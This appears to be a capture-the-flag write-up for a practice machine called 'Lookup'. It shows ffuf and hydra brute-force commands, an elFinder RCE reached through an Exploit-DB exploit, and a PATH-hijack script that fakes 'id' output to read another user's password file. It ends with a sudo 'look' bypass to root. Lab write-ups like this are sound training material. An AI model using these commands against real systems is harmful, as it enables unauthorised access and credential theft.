## Website Features
- Login page

![Login](https://c00lrabbit.github.io/assets/assets/Images/Lookup/Login-page.png)

- I tried injection attacks, Intercepted the traffic and Analyzed but no use.

#### Using ffuf we can try bruteforcing the login

```bash
ffuf -w /usr/share/wordlists/seclists/Passwords/2023-200_most_used_passwords.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -fw 8 
```
![ffuf password ](https://c00lrabbit.github.io/assets/Images/Lookup/fuff-password.png)

But this password doesn't login so i enumerated the username

```bash
 ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-username.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=password123' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8 
```

![ffuf uname](https://c00lrabbit.github.io/assets/Images/Lookup/fuff-uname.png)

- After we login with the correct credentials we get into `files.lookup.thm` vhost.
- There is a service running on this vhost named "elFinder".

![elfinder dashboard](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-hpage.png)

- Found the version of the elFinder

![elfinder version info](https://c00lrabbit.github.io/assets/Images/Lookup/elfinder-info.png)

# Exploitation

- This version is vulnerable to php command injection which leads to RCE.
- We found a Exploit from Exploit-DB https://www.exploit-db.com/exploits/46481

![exploit sshell](https://c00lrabbit.github.io/assets/Images/Lookup/exploit-shell.png)

We can upgrade this into interactive shell using Reverse shell.com
![rev-shell](https://c00lrabbit.github.io/assets/Images/Lookup/revshell-generator.png)

- After running linpeas we found a SUID
![linpeas-suid](https://c00lrabbit.github.io/assets/Images/Lookup/linpeas-SUID.png)

- Running pwm binary

![pwm-binary](https://c00lrabbit.github.io/assets/Images/Lookup/pwm-binary.png)

## Analysing the binary
- When we run this binary it executes `id` command and from the result it search for a .password file under the user.

```bash
cd /tmp
echo '#!/bin/bash' > id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
chmod +x id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```
### Breakdown of the above commands
- We are redirecting to `/tmp` because `/tmp` directory have mostly read and write access.
- Creating a shell script named 'id' we are echoing the commands into the file 'id'.
-  Adding Execution privilege to the script and exporting `/tmp` dir to PATH, Here comes the intresting part in linux when we are running a command or file it first check the location of the file form the PATHS list so here we are adding the `/tmp` which makes the `/usr/sbin/pwm` script to run our malicious 'id' script.
- Our script will output like the think user and we can read the /home/think/.passwords file Because the pwm script thinks we are 'think' user.

- After running the above line we get this password list

```
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
....

```

- Using hydra we can bruteforce the login

```bash
hydra -l think -P password.txt ssh://lookup.thm -t 40 -v
```
![hydra-out](https://c00lrabbit.github.io/assets/Images/Lookup/hydra-out.png)

# Privilege Escalation

- Using the found credentials we can ssh into the machine.
```
ssh think@lookup.thm
```

- After running `sudo -l` we found that we have access to "look" with sudo.
- After search in GTFO bins [Click Here](https://gtfobins.github.io/gtfobins/look/#sudo) we found a bypass.

![GTFO-Bins](https://c00lrabbit.github.io/assets/Images/Lookup/gtfo-bin.png)

- We got the root

![root](https://c00lrabbit.github.io/assets/Images/Lookup/Root.png)

## Conclusion
- Bypassing the login page is bit tricky and getting the password list you have to think outside the box.
- Privilege escalation is Stright forward.
- Overall it is a good machine to Test you bruteforcing skills and Enumeration skills.
